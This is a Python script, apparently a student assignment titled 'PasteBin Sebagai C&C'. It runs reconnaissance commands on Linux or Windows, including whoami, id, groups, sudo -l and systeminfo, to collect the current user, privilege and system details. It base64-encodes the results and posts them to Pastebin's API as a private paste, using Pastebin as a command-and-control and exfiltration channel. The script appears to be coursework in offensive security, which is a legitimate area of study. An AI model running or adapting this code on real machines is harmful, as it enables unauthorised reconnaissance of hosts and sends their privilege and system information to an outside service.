"""
Name    : Ardian Danny
NIM     : 2301847303
Kelas   : LA07
Topic   : PasteBin Sebagai C&C
"""


import os
import sys
import base64
import requests
import subprocess
from getopt import getopt


RESULT = ''
VERBOSE = False


def help():
    print("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Host Reconnaissance Help Menu -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
    print("-v --verbose                           : Run this program verbosely")
    print("-h --help                              : Print this help menu")
    print("\n\nExamples:")
    print("python3 host_reconnaissance_2301847303.py -h")
    print("python3 host_reconnaissance_2301847303.py -v")
    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")


def enum_linux():
    
    collected = ''
    
    if VERBOSE:
        print("[*] Getting hostname and system information..")
    
    process = subprocess.Popen(args="hostnamectl", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    hostname = output.decode()
    
    collected += f"[*] Detailed Hostname and Info: \n{hostname}\n" 
    
    if VERBOSE:
        if error != b'':
            print(error.decode())
        else:
            print(hostname)
    
    
    if VERBOSE:
        print("[*] Getting current user information..")
    
    process = subprocess.Popen(args="whoami", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    whoami = f"[+] Current user: {output.decode()}\n" 
    
    collected += whoami
    
    if VERBOSE:
        if error != b'':
            print(error.decode())
        else:
            print(whoami)
    
    process = subprocess.Popen(args="id", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    userid = f"[+] Current user Id: {output.decode()}\n" 
    
    collected += userid
    
    if VERBOSE:
        if error != b'':
            print(error.decode())
        else:
            print(userid)
    
    process = subprocess.Popen(args="groups", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    groups = f"[+] Current user Groups: {output.decode()}\n" 
    
    collected += groups
    
    if VERBOSE:
        if error != b'':
            print(error.decode())
        else:
            print(groups)
    
    
    if VERBOSE:
        print("[*] Getting current user privileges..")
    
    process = subprocess.Popen(args="sudo -l", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    privileges = f"[+] Privileges: \n{output.decode()}\n" 
    
    collected += privileges
    
    if VERBOSE:
        if error != b'':
            print(error.decode())
        else:
            print(privileges)
    
    return base64.b64encode(collected.encode()) 


def enum_windows():
    
    collected = ''
    
    if VERBOSE:
        print("[*] Getting hostname and system information..")
    
    process = subprocess.Popen(args="systeminfo", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    hostname = output.decode()
    
    collected += f"[*] Detailed Hostname and Info: \n{hostname}\n" 
    
    if VERBOSE:
        if error != b'':
            print(error.decode())
        else:
            print(hostname)
    
    
    if VERBOSE:
        print("[*] Getting current user information and privileges..")
    
    process = subprocess.Popen(args="whoami /all", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    user_info_priv = output.decode()
    
    collected += f"[*] Detailed current user information and privileges: \n{user_info_priv}\n" 
    
    if VERBOSE:
        if error != b'':
            print(error.decode())
        else:
            print(user_info_priv)
            
    return base64.b64encode(collected.encode()) 


def upload_to_pastebin():
    
    # Documentation: https://pastebin.com/doc_api
    
    url = "https://pastebin.com/api/api_post.php"
    api_dev_key = '' # PAKAI DEV KEY SENDIRI YA, HEHE
    api_paste_code = RESULT
    api_paste_private = 1
    api_paste_name = "enumeration_result.txt"
    api_option = 'paste'
    
    data = {
        'api_dev_key': api_dev_key,
        'api_paste_code': api_paste_code,
        'api_paste_private': api_paste_private,
        'api_paste_name': api_paste_name,
        'api_option': api_option
    }
    
    
    paste = requests.post(url, data=data)
    paste_url = paste.text

    print(f"[+] You can check the result on PasteBin on this link: {paste_url}")


def main():
    
    global VERBOSE, RESULT
    
    options, _ = getopt(sys.argv[1:], "hv", ["help", "verbose"])

    for key, value in options:
    
        if (key in ["-h", "--help"]):
            help()
            sys.exit()
        
        elif key in ["-v", "--verbose"]:  
            VERBOSE = True
        
    
    if os.name == 'nt':
        RESULT = enum_windows()
    else:
        RESULT = enum_linux()
    
    upload_to_pastebin()


if __name__ == "__main__":
    
    main()








